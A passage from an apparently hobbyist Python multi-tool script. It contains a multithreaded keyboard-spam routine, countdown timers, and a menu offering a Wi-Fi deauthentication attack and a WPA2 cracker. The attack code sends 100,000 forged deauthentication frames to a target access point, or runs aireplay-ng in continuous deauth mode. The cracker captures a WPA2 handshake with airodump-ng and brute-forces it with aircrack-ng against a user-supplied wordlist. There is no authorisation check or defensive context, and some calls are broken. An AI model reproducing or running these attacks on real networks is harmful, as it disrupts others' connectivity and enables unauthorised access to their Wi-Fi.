                             time_sleep = int(input(Fore.GREEN + "[+] Enter the time you want to stay untill the programm wil start to spam: "))
                             

                             list_of_threads_2 = []
                             str(sleep(time_sleep))
                             # while loop to spam with the variable x 
                             def gg():
                                while True:
                                    # write x
                                    pyautogui.write(x + "\n")
                                    # press
                                    pyautogui.press("enter")
                             for i in range(50):
                                t = threading.Thread(target=gg)
                                t.daemon  = True
                                list_of_threads_2.append(t)
                             for i in range(50):
                                 list_of_threads_2[i].start()
                             for i in range(50):
                                 list_of_threads_2[i].join()
                    except KeyboardInterrupt:
                        exit()
                if tool4 == "23":
                    try:
                        while True:
                            print("\n" +  Fore.BLUE +"[!] Enter cls to clear the screen" + "\n")
                            m = input("[+] Do you want to start the timer[yes/no]: ")
                            if m == "no":
                                exit()
                            if m == "yes":
                                while(True):
                                    seconds = int(input(Fore.GREEN + "[+] How many seconds do you want the timer to wait: "))
                                    pth = input(Fore.GREEN + "[+] Enter the path of the alarm: ")

                                    for i in range(seconds):
                                        print(str(seconds - i) +  Fore.BLUE + " seconds remain")
                                        time.sleep(1)
                                    playsound(pth)
                                    print( Fore.BLUE + "[!!!] Time is up")
                            if m == "cls":
                                try:
                                    os.system('cls')
                                except:
                                    os.system('clear')
                    except KeyboardInterrupt:
                        exit()
                if tool4 == "24":
                    try:
                        class Countdown(tk.Frame):
                                            '''A Frame with label to show the time left, an entry
                                               to input the seconds to count down from, and a
                                               start button to start counting down.'''
                                            def __init__(self, master):
                                                super().__init__(master)
                                                self.create_widgets()
                                                self.show_widgets()
                                                self.seconds_left = 0
                                                self._timer_on = False

                                            def show_widgets(self):
                                            
                                                self.label.pack()
                                                self.entry.pack()
                                                self.start.pack()

                                            def create_widgets(self):
                                            
                                                self.label = tk.Label(self, text="00:00:00")
                                                self.entry = tk.Entry(self, justify='center')
                                                self.entry.focus_set()
                                                self.start = tk.Button(self, text="Start",
                                                                       command=self.start_button)

                                            def countdown(self):
                                                '''Update label based on the time left.'''
                                                self.label['text'] = self.convert_seconds_left_to_time()

                                                if self.seconds_left:
                                                    self.seconds_left -= 1
                                                    self._timer_on = self.after(1000, self.countdown)
                                                else:
                                                    self._timer_on = False

                                            def start_button(self):
                                                '''Start counting down.'''
                                                # 1. to fetch the seconds
                                                self.seconds_left = int(self.entry.get())
                                                # 2. to prevent having multiple
                                                self.stop_timer()
                                                #    timers at once
                                                self.countdown()                            

                                            def stop_timer(self):
                                                '''Stops after schedule from executing.'''
                                                if self._timer_on:
                                                    self.after_cancel(self._timer_on)
                                                    self._timer_on = False

                                            def convert_seconds_left_to_time(self):
                                                return datetime.timedelta(seconds=self.seconds_left)


                        if __name__ == '__main__':
                            root = tk.Tk()
                            root.resizable(False, False)

                            countdown = Countdown(root)
                            countdown.pack()

                            root.mainloop()


                    except KeyboardInterrupt:
                        exit()
                if tool4 == "cls":
                    try:
                        os.system('cls')
                    except:
                        os.system("clear")
                
            except KeyboardInterrupt:
                exit()

        if menu_help == "5":
            try:
                while True:
                    print("\n" + Fore.BLUE + "[19] Deauthentication Attack" + "\n" + Fore.BLUE + "[20] WPA2 Cracker"  )
                    print("\n" + Fore.BLUE + "[!!!] To run any tool from here you must run linux and also don't forget to run the program as sudo" + "\n")
                    acces_tool = input(Fore.GREEN + "[+] Enter the tool you want to acces: ")
                    if acces_tool == "19":
                        if not 'SUDO_UID' in os.environ.keys():
                            print(Fore.BLUE + "[!] Please run the program as sudo")
                            exit()
                        print(Fore.GREEN + 
                            """
                             ____                   _   _                _   _           _   _
                            |  _ \  ___  __ _ _   _| |_| |__   ___ _ __ | |_(_) ___ __ _| |_(_) ___  _ __  
                            | | | |/ _ \/ _` | | | | __| '_ \ / _ \ '_ \| __| |/ __/ _` | __| |/ _ \| '_ \ 
                            | |_| |  __/ (_| | |_| | |_| | | |  __/ | | | |_| | (_| (_| | |_| | (_) | | | |
                            |____/ \___|\__,_|\__,_|\__|_| |_|\___|_| |_|\__|_|\___\__,_|\__|_|\___/|_| |_|

                                _   _   _             _         ~>Deauthentication attack<~ 
                               / \ | |_| |_ __ _  ___| | __    ~~>Made by tfwcodes(github)<~~
                              / _ \| __| __/ _` |/ __| |/ /
                             / ___ \ |_| || (_| | (__|   <
                            /_/   \_\__|\__\__,_|\___|_|\_|

                            """
                        )
                        try:
                            while True:
                                version2 = input(Fore.GREEN + "[+] What version do you want to use[1/2]: ")
                                if version2 == "1":
                                    while True:
                                        try:
                                            interface = input(Fore.GREEN + "[+] Do you have wlan0 started[y/n]: ")
                                            if interface == "y":
                                                while True:
                                                    try:
                                                        subprocess.run(["airmon-ng", "check", "kill"])
                                                        discover = input(Fore.GREEN + "[+] Do you want to discover wifi networks around you[y/n]: ")
                                                        if discover == "n":
                                                            try:
                                                                subprocess.run(["airodump-ng", "wlan0mon"])
                                                                mac_addres = input(Fore.GREEN + "[+] Enter the mac addres of the wifi network: ")
                                                                print(Fore.GREEN + "[!]-----> 0%")
                                                                time.sleep(2)
                                                                print(Fore.GREEN + "[!]-----> 25%")
                                                                time.sleep(2)
                                                                print(Fore.GREEN + "[!]-----> 50%")
                                                                time.sleep(2)
                                                                print(Fore.GREEN + "[!]-----> 100%")
                                                                time.sleep(1)
                                                                print(Fore.GREEN + "[!] The attack is going")
                                                                pkt = RadioTap() / Dot11(addr1=mac_addres, addr2=sys.argv[1], addr3=sys.argv[1])/ Dot11Deauth()
                                                                send(pkt, iface="wlan0", count=100000, inter= .2)
                                                            except KeyboardInterrupt:
                                                                exit()
                                                        if discover == "y":
                                                            try:
                                                                print(Fore.GREEN + "[!]-----> 0%")
                                                                time.sleep(2)
                                                                print(Fore.GREEN + "[!]-----> 25%")
                                                                time.sleep(2)
                                                                print(Fore.GREEN + "[!]-----> 50%")
                                                                time.sleep(2)
                                                                print(Fore.GREEN + "[!]-----> 100%")
                                                                time.sleep(1)
                                                                print(Fore.GREEN + "[!] The attack is going")
                                                                addres_mac = input(Fore.GREEN + "[+] Enter the mac addres of the wifi network: ")
                                                                pkt = RadioTap() / Dot11Deauth(addr1 = addres_mac, addr2 = sys.argv[1], addr3 = sys.argv[1])/ Dot11Deauth()

                                                                send(pkt, iface="wlan0", count=100000, inter = .2)
                                                            except KeyboardInterrupt:
                                                                exit()
                                                    except KeyboardInterrupt:
                                                        exit()
                                            if interface == "n":
                                                while True:
                                                    try:
                                                        subprocess.run(["airmon-ng", "check", "kill"])
                                                        subprocess.run(["airmon-ng", "start", "wlan0"])
                                                        discover2 = input(Fore.GREEN + "[+] Do you want to discover wifi networks around you[y/n]: ")
                                                        if discover2 == "n":
                                                            try:
                                                                class Deauth:
                                                                    subprocess.run(["airodump-ng", "wlan0mon"])
                                                                    print(Fore.GREEN + "[!]-----> 0%")
                                                                    time.sleep(2)
                                                                    print(Fore.GREEN + "[!]-----> 25%")
                                                                    time.sleep(2)
                                                                    print(Fore.GREEN + "[!]-----> 50%")
                                                                    time.sleep(2)
                                                                    print(Fore.GREEN + "[!]-----> 100%")
                                                                    time.sleep(1)
                                                                    print(Fore.GREEN + "[!] The attack is going")
                                                                    mac_addres_2 = input(Fore.GREEN + "[+] Enter the mac addres of the wifi network: ")
                                                                    pkt = RadioTap() / Dot11(addr1=mac_addres_2, addr2=sys.argv[1], addr3=sys.argv[1])/ Dot11Deauth()
                                                                    send(pkt, iface="wlan0", count=100000, inter= .2)
                                                            except KeyboardInterrupt:
                                                                exit()
                                                        if discover2 == "y":
                                                            try:
                                                                print(Fore.GREEN + "[!]-----> 0%")
                                                                time.sleep(2)
                                                                print(Fore.GREEN + "[!]-----> 25%")
                                                                time.sleep(2)
                                                                print(Fore.GREEN + "[!]-----> 50%")
                                                                time.sleep(2)
                                                                print(Fore.GREEN + "[!]-----> 100%")
                                                                time.sleep(1)
                                                                print(Fore.GREEN + "[!] The attack is going")
                                                                class WifiDoS:
                                                                    addres_mac_2 = input(Fore.GREEN + "[+] Enter the mac addres of the wifi network: ")
                                                                    pkt = RadioTap() / Dot11Deauth(addr1 = addres_mac_2, addr2 = sys.argv[1], addr3 = sys.argv[1]) / Dot11Deauth()
                                                                    send(pkt, iface="wlan0", count=100000, inter = .2)
                                                            except KeyboardInterrupt:
                                                                exit()
                                                    except KeyboardInterrupt:
                                                        exit()


                                        except KeyboardInterrupt:
                                            exit()
                                if version2 == "2":
                                    while True:
                                        try:
                                            interface2 = input(Fore.GREEN + "[+] Do you have wlan0 started[y/n]: ")
                                            if interface2 == "y":
                                                while True:
                                                    try:
                                                        # Kill any procces that can disturb the attack
                                                        subprocess.run(["airmon-ng", "check", "kill"])
                                                        discover3 = input(Fore.GREEN + "[+] Do you want to discover wifi networks around you[y/n]: ")
                                                        if discover3 == "y":
                                                            while True:
                                                                try:
                                                                    class DeauthWifi:
                                                                        brdmac = input(Fore.GREEN + "[+] Enter the mac addres of the wifi network")
                                                                        print(Fore.GREEN + "[!]-----> 0%")
                                                                        time.sleep(2)
                                                                        print(Fore.GREEN + "[!]-----> 25%")
                                                                        time.sleep(2)
                                                                        print(Fore.GREEN + "[!]-----> 50%")
                                                                        time.sleep(2)
                                                                        print(Fore.GREEN + "[!]-----> 100%")
                                                                        time.sleep(1)
                                                                        print(Fore.GREEN + "[!] The attack is going")
                                                                        subprocess.run(["aireplay-ng", "--deauth", "0", "-a", brdmac, "wlan0mon"])
                                                                except KeyboardInterrupt:
                                                                    exit()

                                                        if discover3 == "n":
                                                            while True:
                                                                try:
                                                                    madbrc = input(Fore.GREEN + "[+] Enter the mac addres: ")
                                                                    print(Fore.GREEN + "[!]-----> 0%")
                                                                    time.sleep(2)
                                                                    print(Fore.GREEN + "[!]-----> 25%")
                                                                    time.sleep(2)
                                                                    print(Fore.GREEN + "[!]-----> 50%")
                                                                    time.sleep(2)
                                                                    print(Fore.GREEN + "[!]-----> 100%")
                                                                    time.sleep(1)
                                                                    print(Fore.GREEN + "[!] The attack is going")
                                                                    class WifiDeauth:
                                                                        subprocess.run(["aireplay-ng", "--deauth", "0", "-a", madbrc, "wlan0mon"])
                                                                except KeyboardInterrupt:
                                                                    exit()

                                                    except KeyboardInterrupt:
                                                        exit()

                                            if interface2 == "n":
                                                try:
                                                    subprocess.run[("airmon-ng", "check", "kill")]
                                                    subprocess.run[("airomon-ng","start", "wlan0")]
                                                    discover3 = input(Fore.GREEN + "[+] Do you want to discover wifi networks around you[y/n]: ")
                                                    if discover3 == "y":
                                                        while True:
                                                            try:
                                                                class DeauthWifi:
                                                                    brdmac = input(Fore.GREEN + "[+] Enter the mac addres of the wifi network")
                                                                    print(Fore.GREEN + "[!]-----> 0%")
                                                                    time.sleep(2)
                                                                    print(Fore.GREEN + "[!]-----> 25%")
                                                                    time.sleep(2)
                                                                    print(Fore.GREEN + "[!]-----> 50%")
                                                                    time.sleep(2)
                                                                    print(Fore.GREEN + "[!]-----> 100%")
                                                                    time.sleep(1)
                                                                    print(Fore.GREEN + "[!] The attack is going")
                                                                    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", brdmac, "wlan0mon"])
                                                            except KeyboardInterrupt:
                                                                exit()
                                                    if discover3 == "n":
                                                        while True:
                                                            try:
                                                                madbrc = input(Fore.GREEN + "[+] Enter the mac addres: ")
                                                                print(Fore.GREEN + "[!]-----> 0%")
                                                                time.sleep(2)
                                                                print(Fore.GREEN + "[!]-----> 25%")
                                                                time.sleep(2)
                                                                print(Fore.GREEN + "[!]-----> 50%")
                                                                time.sleep(2)
                                                                print(Fore.GREEN + "[!]-----> 100%")
                                                                time.sleep(1)
                                                                print(Fore.GREEN + "[!] The attack is going")
                                                                class WifiDeauth:
                                                                    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", madbrc, "wlan0mon"])
                                                            except KeyboardInterrupt:
                                                                exit()
                                                except KeyboardInterrupt:
                                                    exit()
                                        except KeyboardInterrupt:
                                            exit()

                        except KeyboardInterrupt:
                            exit()

                    if acces_tool == "20":
                        if not 'SUDO_UID' in os.environ.keys():
                            print(Fore.BLUE + "[!] Run the program as sudo")
                        print(
                            Fore.GREEN + 
                            """
                            __        ______   _    ____     ____                _
                            \ \      / /  _ \ / \  |___ \   / ___|_ __ __ _  ___| | _____ _ __ 
                             \ \ /\ / /| |_) / _ \   __) | | |   | '__/ _` |/ __| |/ / _ \ '__|
                              \ V  V / |  __/ ___ \ / __/  | |___| | | (_| | (__|   <  __/ |   ~>WPA2 Cracker<~
                               \_/\_/  |_| /_/   \_\_____|  \____|_|  \__,_|\___|_|\_\___|_|  ~~>Made by tfwcodes(github)<~~


                            """
                        )
                        while True:
                            try:
                                subprocess.run(["airmon-ng", "check", "kill"])
                                zad = input(Fore.GREEN + "[+] Do you have wlan0 started: ")
                                if zad == "y":
                                    while True:
                                        subprocess.run(["airodump-ng", "start", "wlan0mon"])
                                        zad2 = input(Fore.GREEN + "[+] What is the mac addres of your target: ")
                                        zad3 = input(Fore.GREEN + "[+] What is the channel of your target: ")
                                        print(Fore.BLUE + "[!] Wait untill the WPA Handshake will be captured (if it takes more than 2 minutes this will mean that the attack is not working)")
                                        subprocess.run(["airodump-ng", "-w", "hack1", "-c", zad3, "--bssid", zad2, "wlan0mon"]) 
                                        sleep(120)
                                        print(Fore.BLUE + "[!] If you didn't captured any WPA2 Handshake the attack will not work")
                                        dictionary = input(Fore.GREEN + "[+] Enter the dictionary path: ")  
                                        subprocess.run(["aircrack-ng", "hack1-01.cap", "-w", dictionary])
                                if zad == "n":
                                    while True:
                                        subprocess.run(["airmon-ng", "check", "kill"])
                                        subprocess.run(["airmon-ng", "start", "wlan0"])
                                        while True:
                                            subprocess.run(["airodump-ng", "start", "wlan0mon"])
                                            zad3 = input(Fore.GREEN + "[+] What is the mac addres of your target: ")
                                            zad4 = input(Fore.GREEN + "[+] What is the channel of your target: ")
                                            print(Fore.BLUE + "[!] Wait untill the WPA Handshake will be captured (if it takes more than 2 minutes this will mean that the attack is not working)")
                                            subprocess.run(["airodump-ng", "-w", "hack1", "-c", zad4, "--bssid", zad3, "wlan0mon"]) 
                                            sleep(120)
                                            print(Fore.BLUE + "[!] If you didn't captured any WPA2 Handshake the attack will not work")
                                            dictionary2 = input(Fore.GREEN + "[+] Enter the dictionary path: ")  
                                            subprocess.run(["aircrack-ng", "hack1-01.cap", "-w", dictionary2])
                            except KeyboardInterrupt:
                                exit()    
            
            except KeyboardInterrupt:
                exit()

        if menu_help == "cls":
            try:
                os.system('cls')
            except:
                os.system('clear')       
    except KeyboardInterrupt:
        exit()